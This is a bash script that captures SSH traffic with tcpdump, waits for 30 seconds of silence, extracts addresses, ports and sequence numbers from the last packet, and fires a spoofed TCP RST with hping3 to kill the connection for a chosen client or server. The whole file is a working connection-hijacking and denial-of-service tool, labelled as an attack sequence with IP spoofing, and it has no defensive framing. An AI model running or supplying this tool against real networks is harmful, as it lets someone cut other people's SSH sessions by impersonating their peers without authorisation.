#!/bin/bash

# --- Configuration ---
INTERFACE="eth0"   # Change this to your interface (e.g., wlan0, ens33)
LOG_FILE="/tmp/ssh_monitor.log"
DUMP_FILE="/tmp/ssh_packet_data.txt"

# Ensure we are root
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root (sudo)"
  exit
fi

# Cleanup function to kill background tcpdump on exit
cleanup() {
    echo ""
    echo "[*] Cleaning up processes..."
    kill $TCPDUMP_PID 2>/dev/null
    rm -f $LOG_FILE $DUMP_FILE
    exit
}
trap cleanup SIGINT SIGTERM

echo "--- Bash SSH Monitor & Terminator (hping3) ---"
echo "This script monitors TCP Port 22. If traffic stops for 30s, it kills the connection."

# 1. Get User Input
read -p "Enter Interface (default: eth0): " input_iface
if [ ! -z "$input_iface" ]; then INTERFACE=$input_iface; fi

read -p "Who do you want to disconnect? (S)erver or (C)lient: " TARGET_OPT
TARGET_OPT=${TARGET_OPT^^} # Uppercase

if [[ "$TARGET_OPT" != "S" && "$TARGET_OPT" != "C" ]]; then
    echo "Invalid option. Exiting."
    exit 1
fi

echo "[*] Monitoring on $INTERFACE... Waiting for SSH traffic."

# 2. Start TCPDUMP in background
# -n: Don't resolve hostnames
# -S: Print Absolute Sequence Numbers (CRITICAL for hping3)
# -l: Line buffered (so we can read it immediately)
# -tt: Timestamp in seconds
# Filter: TCP Port 22
# We write to a log file to parse later
tcpdump -i $INTERFACE -n -S -l -tt tcp port 22 > $LOG_FILE 2>/dev/null &
TCPDUMP_PID=$!

# 3. Display Headers Loop (Requirement: Display fields if no data)
# We run a separate tail loop to show the user the headers as requested
tail -f $LOG_FILE | while read line; do
    # Simple heuristic: If length is 0 or very small (header only), print it
    # Typical TCP header is ~32-60 bytes. 'length 0' in tcpdump usually means payload 0.
    if echo "$line" | grep -q "length 0"; then
        echo "----------------------------------------------------------------"
        echo "[+] Control Packet Detected (No Data):"
        # Print a formatted version of the tcpdump line
        echo "    $line" | awk '{printf "    Time: %s\n    Src: %s > Dst: %s\n    Flags: %s\n    Seq: %s\n    Ack: %s\n", $1, $3, $5, $7, $9, $11}'
    fi
done &
TAIL_PID=$!

# 4. Monitor Loop (The 30s Timer)
LAST_SEEN_TIME=$(date +%s)
STABILIZED=false

while true; do
    sleep 1
    
    # Get the timestamp of the LAST packet from the log
    # Tail -n 1 gets the last line. Awk prints the first column (Timestamp)
    LAST_PACKET_LINE=$(tail -n 1 $LOG_FILE 2>/dev/null)
    
    if [ -z "$LAST_PACKET_LINE" ]; then
        continue
    fi
    
    # Extract timestamp (remove decimal part for bash math)
    LAST_PACKET_TS=$(echo $LAST_PACKET_LINE | awk '{print $1}' | cut -d. -f1)
    CURRENT_TS=$(date +%s)
    
    # Calculate silence duration
    # Note: If no packets ever arrived, LAST_PACKET_TS might be empty
    if [ ! -z "$LAST_PACKET_TS" ]; then
        DIFF=$((CURRENT_TS - LAST_PACKET_TS))
    else
        DIFF=0
    fi
    
    # Logic: If diff is small, we are active. If big, we stabilize.
    if [ $DIFF -lt 30 ]; then
        if [ "$STABILIZED" = true ]; then
            echo "[!] New activity detected! Resetting 30s timer..."
            STABILIZED=false
        fi
        # Only print countdown occasionally to avoid spam
        # echo -ne "    Silence: $DIFF seconds...\r"
    elif [ $DIFF -ge 30 ] && [ "$STABILIZED" = false ]; then
        echo ""
        echo "[***] Connection Stabilized! (No activity for 30s)"
        STABILIZED=true
        
        # --- ATTACK SEQUENCE ---
        
        # 1. Parse details from the LAST seen packet to spoof correctly
        # Format example: 123.456 IP 192.168.1.5.5566 > 10.0.0.1.22: Flags [P.], seq 100:200, ack 500, win...
        
        # Extract IPs and Ports
        SRC_FULL=$(echo $LAST_PACKET_LINE | awk '{print $3}')
        DST_FULL=$(echo $LAST_PACKET_LINE | awk '{print $5}' | sed 's/://g')
        
        # Split IP and Port (Bash variable manipulation)
        SRC_IP=${SRC_FULL%.*}
        SRC_PORT=${SRC_FULL##*.}
        DST_IP=${DST_FULL%.*}
        DST_PORT=${DST_FULL##*.}
        
        # Extract Sequence and Ack
        # tcpdump output: "seq 123123, ack 456456"
        # We need to grab the number *after* 'seq' and 'ack'
        SEQ_NUM=$(echo $LAST_PACKET_LINE | grep -o 'seq [0-9]*' | awk '{print $2}')
        ACK_NUM=$(echo $LAST_PACKET_LINE | grep -o 'ack [0-9]*' | awk '{print $2}')
        PAYLOAD_LEN=$(echo $LAST_PACKET_LINE | grep -o 'length [0-9]*' | awk '{print $2}')

        if [ -z "$SEQ_NUM" ]; then SEQ_NUM=0; fi
        if [ -z "$ACK_NUM" ]; then ACK_NUM=0; fi
        if [ -z "$PAYLOAD_LEN" ]; then PAYLOAD_LEN=0; fi

        # LOGIC:
        # If we target the Server, we pretend to be the Client.
        # We use Client IP/Port as Source.
        # We must use the SEQ number the Server expects (Current Client SEQ + Payload)
        
        ATTACK_SRC_IP=""
        ATTACK_DST_IP=""
        ATTACK_PORT_SRC=""
        ATTACK_PORT_DST=""
        ATTACK_SEQ=""

        # Check direction of the last packet to determine who sent it
        # If SRC_PORT is 22, the Server sent the last packet.
        if [ "$SRC_PORT" == "22" ]; then
            # Last packet: Server -> Client
            if [ "$TARGET_OPT" == "C" ]; then
                # Target Client. Spoof Server.
                echo "[*] Last packet was Server->Client. Perfect for targeting Client."
                ATTACK_SRC_IP=$SRC_IP
                ATTACK_DST_IP=$DST_IP
                ATTACK_PORT_SRC=$SRC_PORT
                ATTACK_PORT_DST=$DST_PORT
                ATTACK_SEQ=$((SEQ_NUM + PAYLOAD_LEN)) # Next expected SEQ
            else
                # Target Server. Spoof Client.
                echo "[*] Last packet was Server->Client. Need to spoof Client (Destination of last packet)."
                ATTACK_SRC_IP=$DST_IP
                ATTACK_DST_IP=$SRC_IP
                ATTACK_PORT_SRC=$DST_PORT
                ATTACK_PORT_DST=$SRC_PORT
                ATTACK_SEQ=$ACK_NUM # The Server expects the Client's ACK as the new SEQ
            fi
        else
            # Last packet: Client -> Server
            if [ "$TARGET_OPT" == "S" ]; then
                # Target Server. Spoof Client.
                echo "[*] Last packet was Client->Server. Perfect for targeting Server."
                ATTACK_SRC_IP=$SRC_IP
                ATTACK_DST_IP=$DST_IP
                ATTACK_PORT_SRC=$SRC_PORT
                ATTACK_PORT_DST=$DST_PORT
                ATTACK_SEQ=$((SEQ_NUM + PAYLOAD_LEN))
            else
                # Target Client. Spoof Server.
                echo "[*] Last packet was Client->Server. Need to spoof Server (Destination of last packet)."
                ATTACK_SRC_IP=$DST_IP
                ATTACK_DST_IP=$SRC_IP
                ATTACK_PORT_SRC=$DST_PORT
                ATTACK_PORT_DST=$SRC_PORT
                ATTACK_SEQ=$ACK_NUM
            fi
        fi

        echo "------------------------------------------------"
        echo "    Injecting RST Packet..."
        echo "    Spoofing IP:   $ATTACK_SRC_IP"
        echo "    Target IP:     $ATTACK_DST_IP"
        echo "    Spoofing Port: $ATTACK_PORT_SRC"
        echo "    Target Port:   $ATTACK_PORT_DST"
        echo "    Sequence Num:  $ATTACK_SEQ"
        echo "------------------------------------------------"

        # 5. EXECUTE HPING3
        # -R : Reset Flag
        # -c 1 : Count 1 packet
        # -s : Source Port
        # -p : Destination Port
        # -a : Spoof Source IP
        # -M : Sequence Number
        hping3 -c 1 -R -s $ATTACK_PORT_SRC -p $ATTACK_PORT_DST -a $ATTACK_SRC_IP -M $ATTACK_SEQ $ATTACK_DST_IP > /dev/null 2>&1
        
        echo "[***] Packet Sent. Connection Terminated."
        kill $TAIL_PID 2>/dev/null
        cleanup
    fi
done